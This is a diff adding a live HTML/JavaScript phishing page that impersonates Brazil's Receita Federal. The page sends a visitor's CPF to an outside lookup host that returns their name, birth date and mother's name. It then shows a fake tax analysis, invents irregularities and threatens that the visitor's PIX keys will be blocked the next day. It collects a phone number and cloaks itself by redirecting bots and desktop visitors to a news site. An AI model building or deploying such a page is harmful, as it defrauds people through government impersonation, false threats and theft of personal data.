@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html data-template="buscar-cpf">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Buscar CPF</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script>
+    // Função para detectar se é um dispositivo móvel
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Função para detectar se é um bot
+    function isBot() {
+      const botAgents = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+      ];
+
+      return botAgents.some(bot => navigator.userAgent.includes(bot));
+    }
+
+    // Função para verificar se a largura da janela é maior que 768px
+    function isWideScreen() {
+      return window.innerWidth > 768;
+    }
+
+    // Redirecionar ou bloquear o acesso
+    function checkAccess() {
+      if (isBot() || (!isMobile() && isWideScreen())) {
+        // Redirecionar para o site G1 se o acesso for bloqueado
+        window.location.href = "https://g1.globo.com/";
+      }
+    }
+
+    // Executar a função de verificação ao carregar a página
+    window.onload = checkAccess;
+
+    // Adicionar um listener para verificar novamente se a janela for redimensionada
+    window.addEventListener('resize', checkAccess);
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 140px; /* Reduced logo size */
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        .info-box {
+            border-left: 4px solid #0c326f;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: auto; /* Removed fixed height */
+        }
+        .info-box h2 {
+            color: #0c326f;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .info-box p {
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+        .initial-content {
+            transition: opacity 0.3s ease;
+        }
+        .user-data {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+        .user-data-item {
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: #0c326f;
+            display: flex;
+            align-items: center;
+        }
+        .user-data-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+            color: #0c326f;
+        }
+        .cpf-form {
+            background-color: white;
+            padding: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .cpf-input:focus {
+            border-color: #0c326f;
+            outline: none;
+        }
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .submit-button:hover {
+            background-color: #092555;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(12, 50, 111, 0.2);
+        }
+        .analysis-container {
+            margin: 20px 0;
+        }
+        .analysis-step {
+            padding: 12px 15px;
+            margin: 8px 0;
+            border-left: 3px solid #0c326f;
+            background: #f8f9fa;
+            border-radius: 4px;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideIn 0.8s ease forwards;
+        }
+        .analysis-step div {
+            line-height: 1.2;
+        }
+        .warning-message {
+            margin: 25px 0;
+            font-weight: 600;
+            color: #721c24;
+            line-height: 1.6;
+            padding: 20px;
+            border: 1px solid #dc3545;
+            border-radius: 8px;
+        }
+        .irregularities {
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+        .irregularity-item {
+            margin-bottom: 20px;
+            padding-left: 25px;
+            position: relative;
+        }
+        .irregularity-title {
+            color: #721c24;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .user-details {
+            border-bottom: 2px solid #0c326f;
+            padding-bottom: 15px;
+            margin: 20px 0;
+            line-height: 1.3;
+        }
+        .user-details strong {
+            display: block;
+            color: #0c326f;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        .irregularities {
+            line-height: 1.3;
+            margin: 15px 0;
+        }
+        .irregularity-item {
+            margin-bottom: 12px;
+        }
+        .irregularity-item div {
+            line-height: 1.3;
+            margin-top: 4px;
+        }
+        .warning-message {
+            line-height: 1.3;
+            margin: 15px 0;
+        }
+        @media (max-width: 600px) {
+            .user-details strong {
+                font-size: 16px;
+            }
+            .irregularity-title {
+                font-size: 16px;
+            }
+            .warning-message {
+                font-size: 14px;
+                padding: 15px;
+            }
+            .logo {
+                width: 120px;
+            }
+            .analysis-step {
+                padding: 6px 10px;
+                margin: 3px 0;
+            }
+            .analysis-step div {
+                line-height: 1.2;
+            }
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        .loading-item {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            padding: 15px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.8s ease forwards;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .loading-item i {
+            margin-right: 15px;
+            font-size: 18px;
+            color: #0c326f;
+        }
+        .progress-bar {
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin-top: 4px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: #0c326f;
+            width: 0;
+            animation: progressFill 2s ease-in-out;
+        }
+        @keyframes progressFill {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        @keyframes pulseWarning {
+            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
+        }
+        .regularize-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 20px 0 40px;
+            transition: all 0.3s ease;
+            animation: pulseButton 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .regularize-button:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
+        }
+        @keyframes pulseButton {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .phone-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .phone-modal-content {
+            background-color: #fff;
+            margin: 10% auto;
+            width: 95%;
+            max-width: 600px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: slideUp 0.3s ease;
+        }
+
+        .phone-modal-header {
+            background-color: #0c326f;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px 8px 0 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .phone-modal-body {
+            padding: 20px;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .phone-input:focus {
+            border-color: #0c326f;
+            outline: none;
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .continue-button:hover {
+            background-color: #092555;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body class="buscar-cpf-page">
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="info-box">
+            <div class="initial-content">
+                <h2>Verificação de Débitos - Receita Federal</h2>
+                <p>Para consultar possíveis débitos junto à Receita Federal e evitar o bloqueio das suas chaves PIX, insira seu CPF no campo abaixo.</p>
+                <p>A consulta é rápida e segura. O sistema verificará automaticamente a existência de pendências tributárias que possam afetar suas operações PIX.</p>
+            </div>
+            <div class="cpf-form" id="cpfFormContainer">
+                <input type="tel" id="cpfInput" class="cpf-input" placeholder="Digite seu CPF" pattern="\d*" maxlength="14">
+                <button id="verifyButton" class="submit-button">
+                    <i class="fas fa-search"></i>
+                    Realizar Consulta
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <div id="phoneModal" class="phone-modal">
+        <div class="phone-modal-content">
+            <div class="phone-modal-header">
+                Atualização Cadastral
+            </div>
+            <div class="phone-modal-body">
+                <p style="margin-bottom: 15px;">Para prosseguir com a regularização, precisamos confirmar seu telefone:</p>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="(XX) XXXXX-XXXX" maxlength="15">
+                <button id="continueButton" class="continue-button">
+                    Continuar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const infoBox = document.querySelector('.info-box');
+
+            document.getElementById('cpfInput').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+
+                if (value.length > 9) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+                } else if (value.length > 6) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
+                } else if (value.length > 3) {
+                    value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
+                }
+
+                e.target.value = value;
+            });
+
+            document.getElementById('verifyButton').addEventListener('click', async function() {
+                const button = this;
+                const cpfInput = document.getElementById('cpfInput');
+                const cpf = cpfInput.value.replace(/\D/g, '');
+
+                if (cpf.length !== 11) {
+                    alert('Por favor, digite um CPF válido');
+                    return;
+                }
+
+                button.disabled = true;
+                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+
+                // Remover conteúdo inicial
+                const initialContent = document.querySelector('.initial-content');
+                if (initialContent) {
+                    initialContent.style.opacity = '0';
+                    initialContent.remove();
+                }
+
+                try {
+                    const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token={{ verification_token }}&cpf=${cpf}`);
+                    const data = await response.json();
+
+                    if (data.DADOS) {
+                        // Salvar dados no localStorage
+                        localStorage.setItem('userData', JSON.stringify({
+                            nome: data.DADOS.nome,
+                            cpf: cpf
+                        }));
+
+                        const loadingContainer = document.createElement('div');
+                        loadingContainer.id = 'loadingContainer';
+                        loadingContainer.style.marginTop = '20px';
+
+                        // Remover formulário
+                        document.getElementById('cpfFormContainer').style.display = 'none';
+
+                        // Adicionar resultados iniciais com novo layout
+                        const dataNascFormatada = data.DADOS.data_nascimento ?
+                            new Date(data.DADOS.data_nascimento).toLocaleDateString('pt-BR') : null;
+
+                        loadingContainer.innerHTML = `
+                            <div class="user-data">
+                                <div class="user-data-item">
+                                    <i class="fas fa-user"></i>
+                                    ${data.DADOS.nome}
+                                </div>
+                                <div class="user-data-item">
+                                    <i class="fas fa-id-card"></i>
+                                    ${cpf}
+                                </div>
+                                ${dataNascFormatada ? `
+                                    <div class="user-data-item">
+                                        <i class="fas fa-calendar"></i>
+                                        Data de Nascimento: ${dataNascFormatada}
+                                    </div>
+                                ` : ''}
+                                ${data.DADOS.nome_mae ? `
+                                    <div class="user-data-item">
+                                        <i class="fas fa-female"></i>
+                                        Nome da Mãe: ${data.DADOS.nome_mae}
+                                    </div>
+                                ` : ''}
+                            </div>
+                            <button id="confirmButton" class="submit-button">
+                                <i class="fas fa-check-circle"></i>
+                                Confirmar meus dados
+                            </button>
+                        `;
+
+                        infoBox.appendChild(loadingContainer);
+
+                        // Configurar evento do botão de confirmação
+                        document.getElementById('confirmButton').addEventListener('click', async function() {
+                            this.style.display = 'none';
+                            loadingContainer.innerHTML = `
+                                <h3 style="color: #0c326f; margin: 15px 0; font-weight: 600;">Análise em andamento...</h3>
+                                <div id="analysisContainer" class="analysis-container"></div>
+                            `;
+
+                            const analysisSteps = [
+                                {
+                                    text: "Iniciando análise do CPF...",
+                                    icon: "search",
+                                    details: "Verificando dados básicos do contribuinte"
+                                },
+                                {
+                                    text: "Analisando transferências PIX desde 2019...",
+                                    icon: "exchange-alt",
+                                    details: "Verificando histórico detalhado de transações"
+                                },
+                                {
+                                    text: "Verificando movimentações financeiras desde 2020...",
+                                    icon: "chart-line",
+                                    details: "Análise profunda de padrões financeiros"
+                                },
+                                {
+                                    text: "Consultando declarações de Imposto de Renda...",
+                                    icon: "file-invoice-dollar",
+                                    details: "Validação completa de declarações anteriores"
+                                },
+                                {
+                                    text: "Analisando registros de Cartão de Crédito...",
+                                    icon: "credit-card",
+                                    details: "Avaliação detalhada de gastos e limites"
+                                },
+                                {
+                                    text: "Verificando histórico de declarações tributárias...",
+                                    icon: "file-contract",
+                                    details: "Análise de documentos fiscais e obrigações"
+                                },
+                                {
+                                    text: "Consultando lista de restrições da Receita Federal...",
+                                    icon: "exclamation-triangle",
+                                    details: "Verificação final de status e pendências"
+                                }
+                            ];
+
+                            const analysisContainer = document.getElementById('analysisContainer');
+
+                            // Function to add random delay between steps
+                            const getRandomDelay = () => Math.floor(Math.random() * (2000 - 1500 + 1)) + 1500;
+
+                            // Function to create and animate a step
+                            const createStep = async (step, index) => {
+                                const stepElement = document.createElement('div');
+                                stepElement.className = 'analysis-step';
+                                stepElement.innerHTML = `
+                                    <div style="display: flex; align-items: center;">
+                                        <i class="fas fa-${step.icon}" style="margin-right: 10px; color: #0c326f;"></i>
+                                        <div>
+                                            <div style="font-weight: 600;">${step.text}</div>
+                                            <div style="font-size: 13px; color: #666; margin-top: 4px;">${step.details}</div>
+                                            <div class="progress-bar">
+                                                <div class="progress-bar-fill"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                `;
+
+                                analysisContainer.appendChild(stepElement);
+
+                                // Add loading animation
+                                await new Promise(resolve => setTimeout(resolve, getRandomDelay()));
+                            };
+
+                            // Process all steps with variable delays
+                            for (let [index, step] of analysisSteps.entries()) {
+                                await createStep(step, index);
+                            }
+
+                            const amanha = new Date();
+                            amanha.setDate(amanha.getDate() + 1);
+                            const dataFormatada = amanha.toLocaleDateString('pt-BR');
+
+                            loadingContainer.innerHTML = `
+                                <div class="user-details">
+                                    <strong>Nome: ${data.DADOS.nome}</strong>
+                                    <strong>CPF: ${cpf}</strong>
+                                </div>
+
+                                <div class="irregularities">
+                                    <div class="irregularity-title">Pendências identificadas junto à Receita Federal:</div>
+
+                                    <div class="irregularity-item">
+                                        <strong>Ano 2023</strong>
+                                        <div style="margin-top: 8px;">
+                                            • Divergências na declaração de renda<br>
+                                            • Inconsistências nos valores declarados
+                                        </div>
+                                    </div>
+
+                                    <div class="irregularity-item">
+                                        <strong>Ano 2024</strong>
+                                        <div style="margin-top: 8px;">
+                                            • Movimentações financeiras incompatíveis<br>
+                                            • Transações não declaradas identificadas
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <p class="warning-message">
+                                    Comunicamos que, devido às irregularidades identificadas, o contribuinte estará na Lista de Bloqueio da Receita Federal a partir de ${dataFormatada}. Todas as chaves PIX serão bloqueadas, impossibilitando a realização e recebimento de transferências via PIX.
+                                </p>
+
+                                <button onclick="showPhoneModal()" class="regularize-button">
+                                    <i class="fas fa-exclamation-triangle"></i>
+                                    Regularizar meu CPF
+                                </button>
+                            `;
+                        });
+                    }
+                } catch (error) {
+                    console.error('Erro:', error);
+                    button.innerHTML = '<i class="fas fa-search"></i> Realizar Consulta';
+                    button.disabled = false;
+                    alert('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
+                }
+            });
+        });
+
+        function formatPhoneNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+
+            if (value.length > 6) {
+                value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
+            } else if (value.length > 2) {
+                value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+            } else if (value.length > 0) {
+                value = value.replace(/^(\d{0,2})/, '($1');
+            }
+
+            input.value = value;
+        }
+
+        function showPhoneModal() {
+            const modal = document.getElementById('phoneModal');
+            const phoneInput = document.getElementById('phoneInput');
+            const continueButton = document.getElementById('continueButton');
+
+            modal.style.display = 'block';
+            phoneInput.focus();
+
+            phoneInput.addEventListener('input', function() {
+                formatPhoneNumber(this);
+            });
+
+            continueButton.addEventListener('click', function() {
+                const phone = phoneInput.value.replace(/\D/g, '');
+                if (phone.length !== 11) {
+                    alert('Por favor, digite um número de telefone válido com DDD');
+                    return;
+                }
+
+                // Get existing user data
+                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                // Add phone number
+                userData.phone = phoneInput.value;
+                // Save back to localStorage
+                localStorage.setItem('userData', JSON.stringify(userData));
+
+                // Redirect to index
+                window.location.href = '/';
+            });
+        }
+    </script>
+</body>
+</html>
